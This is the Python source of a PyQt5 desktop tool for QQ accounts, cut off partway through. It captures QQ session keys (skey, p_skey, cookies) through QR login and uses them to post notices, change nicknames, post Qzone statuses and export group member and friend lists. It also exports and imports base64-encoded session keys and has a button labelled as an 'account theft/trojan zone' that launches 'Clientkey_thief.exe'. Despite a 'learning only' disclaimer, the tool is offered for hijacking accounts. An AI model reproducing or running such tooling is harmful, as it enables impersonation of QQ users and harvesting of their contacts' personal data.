#By sun589(Daniel)
# -*- coding: utf-8 -*-
"""
本软件仅供学习用途 请勿用作违法行为 后果自负!
"""
import os
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import QDialog
import sys
from PyQt5.QtGui import QPixmap, QIcon, QFont
from PIL import Image
import requests
import re
from threading import Thread
import time
import csv
import ctypes
from webbrowser import open as webopen
from urlextract import URLExtract
import base64
import pyperclip
import json

ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("QQkey_Tool")

def bkn(skey):
    #计算bkn
    t,n,o = 5381,0,len(skey)

    while n < o:
        t += (t << 5) + ord(skey[n])
        n += 1

    return t & 2147483647

def ptqrToken(qrsig):
    #计算ptqrtoken
    n,i,e = len(qrsig),0,0

    while n > i:
        e += (e << 5) + ord(qrsig[i])
        i += 1

    return 2147483647 & e

def get_g_tk(p_skey):
    t = 5381
    for i in p_skey:
        t += (t << 5) + ord(i)
    return t & 2147483647

class Ui_Dialog(object):
    def __init__(self, data):
        self.data = data
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(569, 130)
        font = QFont()
        font.setFamily("微软雅黑")
        Dialog.setFont(font)
        self.pushButton_2 = QtWidgets.QPushButton(Dialog)
        self.pushButton_2.setGeometry(QtCore.QRect(440, 50, 75, 23))
        self.pushButton_2.setObjectName("pushButton_2")
        self.label_3 = QtWidgets.QLabel(Dialog)
        self.label_3.setGeometry(QtCore.QRect(70, 80, 111, 21))
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(Dialog)
        self.label_4.setGeometry(QtCore.QRect(30, 10, 111, 31))
        self.label_4.setObjectName("label_4")
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(70, 50, 111, 21))
        self.label.setObjectName("label")
        self.lineEdit = QtWidgets.QLineEdit(Dialog)
        self.lineEdit.setGeometry(QtCore.QRect(170, 50, 261, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_2.setGeometry(QtCore.QRect(170, 80, 261, 20))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.pushButton = QtWidgets.QPushButton(Dialog)
        self.pushButton.setGeometry(QtCore.QRect(440, 80, 75, 23))
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(self.generate)
        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Key配置器"))
        self.pushButton_2.setText(_translate("Dialog", "加载"))
        self.label_3.setText(_translate("Dialog", "<html><head/><body><p><span style=\" font-size:11pt;\">当前Key码:</span></p></body></html>"))
        self.label_4.setText(_translate("Dialog", "<html><head/><body><p><span style=\" font-size:12pt; color:#ff0000;\">Key配置区:</span></p></body></html>"))
        self.label.setText(_translate("Dialog", "<html><head/><body><p><span style=\" font-size:11pt;\">待导入Key码:</span></p></body></html>"))
        self.pushButton.setText(_translate("Dialog", "生成+复制"))

    def generate(self):
        text = base64.b64encode(str(self.data).replace("'",'"').encode('utf-8')).decode('utf-8')
        self.lineEdit_2.setText(text)
        pyperclip.copy(text)

class Ui_MainWindow(QtWidgets.QWidget):
    def setupUi(self, MainWindow):
        self.uin = ''
        self.skey = ''
        self.pskey = ''
        self.cookie = ''
        self.g_tk = ''
        self.qzone_url = ''
        font = QFont()
        font.setFamily("微软雅黑")
        MainWindow.setFont(font)
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(831,567)
        MainWindow.setWindowIcon(QIcon("./icon.ico"))
        QtWidgets.QMessageBox.information(self,"警告","本软件纯免费且开源 如果你是花钱买的火速投诉!\n本软件仅供学习用途 请勿用作违法行为 后果自负!")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(80, 30, 221, 241))
        self.pixmap = QPixmap('二维码不存在.png')
        self.label.setPixmap(self.pixmap)
        self.label.setText("")
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(80, 275, 181, 131))
        self.label_2.setObjectName("label_2")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(80, 390, 200, 51))
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(self.get_qq)
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(340, -30, 16, 631))
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(20, 10, 111, 31))
        self.label_4.setObjectName("label_4")
        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(380, 10, 61, 31))
        self.label_5.setObjectName("label_5")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_2.setGeometry(QtCore.QRect(450, 100, 271, 21))
        self.lineEdit_2.setInputMask("")
        self.lineEdit_2.setText("")
        self.lineEdit_2.setFrame(True)
        self.lineEdit_2.setEchoMode(QtWidgets.QLineEdit.Normal)
        self.lineEdit_2.setDragEnabled(False)
        self.lineEdit_2.setReadOnly(False)
        self.lineEdit_2.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(450, 70, 271, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_3.setGeometry(QtCore.QRect(450, 130, 271, 20))
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.checkBox.setGeometry(QtCore.QRect(390, 180, 51, 16))
        self.checkBox.setObjectName("checkBox")
        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(440, 170, 111, 41))
        self.pushButton_2.setObjectName("pushButton_2")
        self.pushButton_2.clicked.connect(lambda: self.new_notice(
                    text=self.lineEdit_2.text(),q_bkn=bkn(self.skey),
                    pinned=int(self.checkBox.isChecked()),skey=self.skey,
                    pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin)
                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
                    if self.lineEdit_2 and self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                    )
        self.pushButton_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_3.setGeometry(QtCore.QRect(610, 170, 111, 41))
        self.pushButton_3.setObjectName("pushButton_3")
        self.pushButton_3.clicked.connect(lambda: self.qun_list(self.cookie,bkn(self.skey)) if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!"))
        self.pushButton_4 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_4.setGeometry(QtCore.QRect(440, 230, 111, 41))
        self.pushButton_4.setObjectName("pushButton_4")
        self.pushButton_4.clicked.connect(lambda: self.notice_list(
                    q_bkn=bkn(self.skey),skey=self.skey,
                    pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin)
                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
                    if self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                    )
        self.pushButton_5 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_5.setGeometry(QtCore.QRect(610, 230, 111, 41))
        self.pushButton_5.setObjectName("pushButton_5")
        self.pushButton_5.clicked.connect(lambda: self.qun_members_list(
                    bkn=bkn(self.skey),skey=self.skey,
                    pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin)
                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
                    if self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                    )
        self.pushButton_6 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_6.setGeometry(QtCore.QRect(440, 290, 111, 41))
        self.pushButton_6.setObjectName("pushButton_6")
        self.pushButton_6.clicked.connect(lambda: self.del_notice(
                    bkn=bkn(self.skey),skey=self.skey,
                    pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin,fid=self.lineEdit_3.text())
                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
                    if self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                    )
        self.pushButton_7 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_7.setGeometry(QtCore.QRect(610, 290, 111, 41))
        self.pushButton_7.setObjectName("pushButton_7")
        self.pushButton_7.clicked.connect(lambda: self.new_emotion(
                    g_tk=self.g_tk,skey=self.skey,
                    pskey=self.pskey,uin=self.uin,
                    content=self.lineEdit_2.text())
                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
                    if self.lineEdit_2.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                    if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
                    )
        self.pushButton_8 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_8.setGeometry(QtCore.QRect(700, 490, 111, 41))
        self.pushButton_8.setObjectName("pushButton_8")
        self.pushButton_8.clicked.connect(lambda: webopen("https://github.com/sun589/QQkey_Tool"))
        self.pushButton_9 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_9.setGeometry(QtCore.QRect(440, 350, 111, 41))
        self.pushButton_9.setObjectName("pushButton_9")
        self.pushButton_9.clicked.connect(lambda: self.change_name(
                    g_tk=self.g_tk,skey=self.skey,
                    pskey=self.pskey,uin=self.uin,
                    newname=self.lineEdit.text())
                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
                    if self.lineEdit_2.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                    if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
                    )
        self.pushButton_10 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_10.setGeometry(QtCore.QRect(610, 350, 111, 41))
        self.pushButton_10.setObjectName("pushButton_10")
        self.pushButton_10.clicked.connect(lambda: self.get_friend_list(
                    g_tk=self.g_tk,uin=self.uin,skey=self.skey,pskey=self.pskey
        )if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
        if self.lineEdit_2.text() else QtWidgets.QMessageBox.critical(self, "错误", "请先填入内容!")
        if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误", "此功能仅qzone可用!"))
        self.pushButton_11 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_11.setGeometry(QtCore.QRect(560, 490, 111, 41))
        self.pushButton_11.setObjectName("pushButton_11")
        self.pushButton_11.clicked.connect(lambda: os.system('start .\\Clientkey_thief.exe'))
        self.comboBox = QtWidgets.QComboBox(self.centralwidget)
        self.comboBox.setGeometry(QtCore.QRect(80, 265, 200, 22))
        self.comboBox.setEditable(False)
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menuBar = QtWidgets.QMenuBar(MainWindow)
        self.menuBar.setGeometry(QtCore.QRect(0, 0, 831, 23))
        self.menuBar.setObjectName("menuBar")
        self.menu = QtWidgets.QMenu(self.menuBar)
        self.menu.setObjectName("menu")
        MainWindow.setMenuBar(self.menuBar)
        self.action = QtWidgets.QAction(MainWindow)
        self.action.setObjectName("action")
        self.action.triggered.connect(lambda: self.help(1))
        self.action_2 = QtWidgets.QAction(MainWindow)
        self.action_2.setObjectName("action_2")
        self.action_2.triggered.connect(lambda: self.help(2))
        self.action_Key = QtWidgets.QAction(MainWindow)
        self.action_Key.setObjectName("action_Key")
        self.action_Key.triggered.connect(self.open_key_settings)
        self.menu.addAction(self.action)
        self.menu.addAction(self.action_Key)
        self.menu.addAction(self.action_2)
        self.menuBar.addAction(self.menu.menuAction())
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "QQKey_Tool"))
        self.label_2.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
        self.pushButton.setText(_translate("MainWindow", "获取二维码"))
        self.label_3.setText(_translate("MainWindow", "<html><head/><body><p>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/></p></body></html>"))
        self.label_4.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:12pt; color:#ff0000;\">Skey获取区:</span></p></body></html>"))
        self.label_5.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:12pt; color:#ff0000;\">功能区:</span></p></body></html>"))
        self.pushButton_2.setText(_translate("MainWindow", "发布公告(qun)"))
        self.pushButton_3.setText(_translate("MainWindow", "群列表(qun)"))
        self.lineEdit_2.setPlaceholderText(_translate("MainWindow", "QQ号/说说内容/群公告内容"))
        self.lineEdit.setPlaceholderText(_translate("MainWindow", "群号/名字"))
        self.checkBox.setText(_translate("MainWindow", "置顶"))
        self.pushButton_4.setText(_translate("MainWindow", "群公告列表(qun)"))
        self.pushButton_5.setText(_translate("MainWindow", "群成员(qun)"))
        self.pushButton_6.setText(_translate("MainWindow", "删除群公告(qun)"))
        self.lineEdit_3.setPlaceholderText(_translate("MainWindow", "群公告fid"))
        self.pushButton_7.setText(_translate("MainWindow", "发布说说(qzone)"))
        self.pushButton_8.setText(_translate("MainWindow", "打开Github主页"))
        self.comboBox.setCurrentText(_translate("MainWindow", "qzone.qq.com"))
        self.comboBox.setItemText(0, _translate("MainWindow", "qun.qq.com"))
        self.comboBox.setItemText(1, _translate("MainWindow", "qzone.qq.com"))
        self.pushButton_9.setText(_translate("MainWindow", "修改昵称(qzone)"))
        self.pushButton_10.setText(_translate("MainWindow", "好友列表(qzone)"))
        self.pushButton_11.setText(_translate("MainWindow", "盗号/木马专区"))
        self.menu.setTitle(_translate("MainWindow", "菜单"))
        self.action_Key.setText(_translate("MainWindow", "设置Key"))
        self.action.setText(_translate("MainWindow", "使用帮助"))
        self.action_2.setText(_translate("MainWindow", "关于"))

    def open_key_settings(self):
        global data
        data = {
            "uin":self.uin,
            "skey":self.skey,
            "pskey":self.pskey,
            "cookie":self.cookie,
            "g_tk":self.g_tk,
            "qzone_url":self.qzone_url
        }
        dialog = QDialog()
        self.Ui = Ui_Dialog(data)
        self.Ui.setupUi(dialog)
        self.Ui.pushButton_2.clicked.connect(lambda: self.load_key(self.Ui.lineEdit.text()))
        dialog.show()
        dialog.exec_()

    def load_key(self,text):
        try:
            data = base64.b64decode(text.encode('utf-8')).decode('utf-8')
            data = json.loads(data)
            self.skey = data['skey']
            self.pskey = data['pskey']
            self.qzone_url = data['qzone_url']
            self.g_tk = data['g_tk']
            self.uin = data['uin']
            self.cookie = data['cookie']
            _translate = QtCore.QCoreApplication.translate
            self.label_2.setText(_translate("MainWindow",
                                            f"<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:配置加载成功!</span></p><p><span style=\" font-size:11pt;\">QQ号码:{self.uin}</span></p><p><span style=\" font-size:11pt;\">Skey:{self.skey}</span></p></body></html>"))
            QtWidgets.QMessageBox.information(self,"提示","加载成功!")
        except Exception as e:
            print(repr(e))
            QtWidgets.QMessageBox.critical(self,"错误","不是有效的配置码!")
    def help(self,h):
        if h == 1:
            QtWidgets.QMessageBox.information(self, "使用帮助", """发布公告:
参数:输入框1&输入框2        
作用:发布公告              

群列表:                   
参数:无        
作用:获取所有加入的群      

群公告列表:
参数:输入框1
作用:获取已有的群里的群公告

群成员:
参数:输入框1
作用:获取已有的群里的成员

删除群公告:
参数:输入框1&输入框3
作用:删除所在群内的群公告

删除群成员:
参数:输入框1&输入框2
作用:将群内成员移除(需有管理/群主权限)
    """)
        else:
            QtWidgets.QMessageBox.about(self, "使用帮助", "作者:Daniel\n本软件仅供于学习用途 禁止用于违法行为 后果自负")

    def get_qq(self):
        self.qr()
        global flag
        flag = True
        time.sleep(1)
        flag = False
        thread1 = Thread(target=self.cookies,args=(self.ptqrtoken,self.qrsig))
        thread1.start()
    def qr(self):
        print("获取二维码中...")
        if self.comboBox.currentIndex() == 0:
            url = "https://ssl.ptlogin2.qq.com/ptqrshow?appid=715030901&e=2&l=M&s=3&d=72&v=4&t=0.5703512186734734&daid=73&pt_3rd_aid=0&u1=https%3A%2F%2Fqun.qq.com%2F"
        elif self.comboBox.currentIndex() == 1:
            url = "https://ssl.ptlogin2.qq.com/ptqrshow?appid=549000912&e=2&l=M&s=3&d=72&v=4&t=0.7204761844436813&daid=5&pt_3rd_aid=0&u1=https%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone"
        qr_res = requests.get(url)
        self.qrsig = requests.utils.dict_from_cookiejar(qr_res.cookies).get('qrsig')
        print(self.qrsig)
        self.ptqrtoken = ptqrToken(self.qrsig)
        with open("qr.jpg", 'wb') as f:
            f.write(qr_res.content)
        im = Image.open('qr.jpg')
        im = im.resize((200,200))
        im.save('qr.jpg')
        self.pixmap = QPixmap('qr.jpg')
        self.label.setPixmap(self.pixmap)
        print("二维码获取成功!")
    def cookies(self,ptqtoken, qrsig):
        _translate = QtCore.QCoreApplication.translate
        while True:
            global flag
            if flag == True:
                break
            if self.comboBox.currentIndex() == 0:
                l = requests.get(
                    f"https://ssl.ptlogin2.qq.com/ptqrlogin?u1=https%3A%2F%2Fqun.qq.com%2F&ptqrtoken={ptqtoken}&ptredirect=1&h=1&t=1&g=1&from_ui=1&ptlang=2052&action={time.time()}&js_ver=23111510&js_type=1&login_sig=&pt_uistyle=40&aid=715030901&daid=73&&o1vId=2c2a6e92400bf8bd544ea329f5c8b5a0&pt_js_version=v1.48.1",
                    cookies={"qrsig": qrsig})
            elif self.comboBox.currentIndex() == 1:
                l = requests.get(
                    f"https://ssl.ptlogin2.qq.com/ptqrlogin?u1=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone&ptqrtoken={ptqtoken}&ptredirect=0&h=1&t=1&g=1&from_ui=1&ptlang=2052&action=0-0-{time.time()}&js_ver=24032716&js_type=1&login_sig={qrsig}&pt_uistyle=40&aid=549000912&daid=5&&o1vId=cbd33371f0120052de641c9b757a2cf0&pt_js_version=v1.48.2",
                    cookies={"qrsig": qrsig})
            if '二维码未失效' in l.text:
                self.label_2.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:未失效</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
            elif '二维码已失效' in l.text:
                self.label_2.setText(_translate("MainWindow","<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:已失效</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
                break
            elif '二维码认证中' in l.text:
                self.label_2.setText(_translate("MainWindow","<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:认证中</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
            elif '拒绝' in l.text:
                self.label_2.setText(_translate("MainWindow",
                                                "<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:已拒绝</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
                break
            elif '成功' in l.text:
                uin = requests.utils.dict_from_cookiejar(l.cookies).get('uin')
                if self.comboBox.currentIndex() == 0:
                    regex = re.compile(r'ptsigx=(.*?)&')
                    sigx = re.findall(regex, l.text)[0]
                    url = f'https://ptlogin2.qun.qq.com/check_sig?pttype=1&uin={uin}&service=ptqrlogin&nodirect=0&ptsigx={sigx}&s_url=https%3A%2F%2Fqun.qq.com%2Fmanage.html&f_url=&ptlang=2052&ptredirect=101&aid=715030901&daid=73&j_later=0&low_login_hour=0&regmaster=0&pt_login_type=3&pt_aid=0&pt_aaid=16&pt_light=0&pt_3rd_aid=0'
                elif self.comboBox.currentIndex() == 1:
                    extractor = URLExtract()
                    url = extractor.find_urls(l.text)[0]
                    self.qzone_url = url
                cookies = requests.utils.dict_from_cookiejar(l.cookies)
                r2 = requests.get(url, cookies=cookies, allow_redirects=False)
                targetCookies = requests.utils.dict_from_cookiejar(r2.cookies)
                skey = requests.utils.dict_from_cookiejar(r2.cookies).get('skey')
                pskey = requests.utils.dict_from_cookiejar(r2.cookies).get('p_skey')
                self.skey, self.uin, self.pskey = skey, uin, pskey
                self.cookie = targetCookies
                self.label_2.setText(_translate("MainWindow",
                                                f"<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:登录成功!</span></p><p><span style=\" font-size:11pt;\">QQ号码:{self.uin}</span></p><p><span style=\" font-size:11pt;\">Skey:{self.skey}</span></p></body></html>"))
                if self.comboBox.currentIndex() == 1:
                    self.g_tk = get_g_tk(pskey)
                else:
                    self.g_tk = ''
                break
            time.sleep(1)

    def new_notice(self,text, q_bkn, pinned, qid, skey, pskey, uin):
        data = {
            "qid": qid,
            "bkn": q_bkn,
            "text": text,
            "pinned": pinned,
            "type": 1,
            "settings": {"is_show_edit_card": 1, "tip_window_type": 0, "confirm_required": 1}
        }
        headers = {
            "Referer": "https://web.qun.qq.com/mannounce/edit.html?&_wv=5127",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 MQQBrowser/6.2 TBS/046715 Mobile Safari/537.36 V1_AND_SQ_8.9.78_4548_YYB_D QQ/8.9.78.12275 NetType/WIFI WebP/0.3.0 AppId/537175315 Pixel/1080 StatusBarHeight/82 SimpleUISwitch/0 QQTheme/2099 StudyMode/0 CurrentMode/0 CurrentFontScale/1.0 GlobalDensityScale/0.9818182 AllowLandscape/false InMagicWin/0",
            "Host": "web.qun.qq.com",
            "Origin": "https://web.qun.qq.com"
        }
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin)
        }
        requests.post(f"https://web.qun.qq.com/cgi-bin/announce/add_qun_notice?bkn={q_bkn}", params=data,headers=headers, cookies=Cookies)
        QtWidgets.QMessageBox.about(self, "提示", "发布成功!")

    def qun_list(self,cookies,bkn):
        url = 'https://qun.qq.com/cgi-bin/qun_mgr/get_group_list'
        data = {'bkn':bkn}
        qun_lis = requests.post(url,data = data,cookies = cookies).json()
        try:
            with open("qun_list.csv",'w',newline='',encoding='utf-8-sig') as f:
                csv_f = csv.writer(f)
                csv_f.writerow(["群名","群号","群主","权限"])
                l = []
                try:
                    for i in qun_lis['create']:
                        csv_f.writerow([str(i['gn'])+'\t', str(i['gc']), str(i['owner'])+'\t',"群主"])
                except Exception as e:
                    print(e)
                try:
                    for i in qun_lis['manage']:
                        csv_f.writerow([str(i['gc'])+'\t', str(i['gn']), str(i['owner'])+'\t',"管理员"])
                except Exception as e:
                    print(e)
                try:
                    for i in qun_lis['join']:
                        csv_f.writerow([str(i['gc'])+'\t', str(i['gn']), str(i['owner'])+'\t',"成员"])
                except Exception as e:
                    print(e)
                print(l)
                csv_f.writerows(l)
                f.flush()
            QtWidgets.QMessageBox.about(self,"提示","已导出至qun_list.csv文件下!")
        except PermissionError:
            QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开qun_list.csv的文件!")
        except Exception as e:
            QtWidgets.QMessageBox.about(self, "错误", "未知错误!")

    def notice_list(self, q_bkn, qid, skey, pskey, uin):
        data = {
            "qid": qid,
            "bkn": q_bkn,
            "n":"10",
            "s":"-1",
            "ni":"undefined",
            "i":"1",
            "ft":"23"
        }
        headers = {
            "Referer": "https://web.qun.qq.com/mannounce/index.html?_wv=1031&_bid=148",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 MQQBrowser/6.2 TBS/046715 Mobile Safari/537.36 V1_AND_SQ_8.9.78_4548_YYB_D QQ/8.9.78.12275 NetType/WIFI WebP/0.3.0 AppId/537175315 Pixel/1080 StatusBarHeight/82 SimpleUISwitch/0 QQTheme/2099 StudyMode/0 CurrentMode/0 CurrentFontScale/1.0 GlobalDensityScale/0.9818182 AllowLandscape/false InMagicWin/0",
            "Host": "web.qun.qq.com",
            "Origin": "https://web.qun.qq.com"
        }
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin)
        }
        i = 9
        notices = []
        while True:
            res = requests.post(f"https://web.qun.qq.com/cgi-bin/announce/list_announce?bkn={q_bkn}", params=data,json=data,headers=headers, cookies=Cookies).json()
            if "feeds" in res or "inst" in res:
                print(1)
                i -= 10
                print(2)
                data['s'] = i
                try:
                    for j in res['feeds']:
                        notices.append([str(j['u'])+'\t',str(j['fid']),str(j['msg']['text'])+'\t'])
                except Exception as e:
                    print(e)
                try:
                    for j in res['inst']:
                        notices.append([str(j['u'])+'\t',str(j['fid']),str(j['msg']['text'])+'\t'])
                except Exception as e:
                    print(e)
            else:
                break
        try:
            with open("notice_list.csv",'w',newline='',encoding='utf-8-sig') as f:
                csv_f = csv.writer(f)
                csv_f.writerow(['发布者','fid','内容'])
                csv_f.writerows(notices)
            QtWidgets.QMessageBox.about(self, "提示", "已保存至notice_list.csv!")
        except PermissionError:
            QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开notice_list.csv的文件!")
        except Exception as e:
            QtWidgets.QMessageBox.about(self, "错误", "未知错误!")

    def qun_members_list(self,bkn,qid,pskey,skey,uin):
        data = {
            "st":"0",
            "start":"0",
            "end":"9",
            "sort":"1",
            "group_id":str(qid),
            "gc":str(qid)
        }
        headers = {
            "Referer": "https://web.qun.qq.com/mannounce/index.html?_wv=1031&_bid=148",
            "Host": "qun.qq.com",
            "Origin": "https://qun.qq.com"
        }
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin),
            "ptui_loginuin":str(uin)
        }
        l = []
        start = 0
        end = 9
        while True:
            res = requests.post(f"https://qun.qq.com/cgi-bin/qun_mgr/search_group_members?bkn={bkn}&ts=1702901784527",cookies=Cookies,data=data,headers=headers).json()
            try:
                for i in res['mems']:
                    print(l,[str(i['nick'])+'\t',str(i['uin'])+'\t'])
                    if [str(i['nick'])+'\t',str(i['uin'])+'\t'] in l:
                        break
                    l.append([str(i['nick'])+'\t',str(i['uin'])+'\t'])
                start += 10
                end += 10
                data['start'],data['end'] = str(start),str(end)
            except:
                break
        try:
            with open("mem_list.csv",'w',encoding='utf-8-sig',newline='') as f:
                csv_f = csv.writer(f)
                csv_f.writerow([f'群号:{self.lineEdit.text()}\t'])
                csv_f.writerow(['名称','QQ号'])
                csv_f.writerows(l)
            QtWidgets.QMessageBox.about(self, "提示", "已保存至mem_list.csv!")
        except PermissionError:
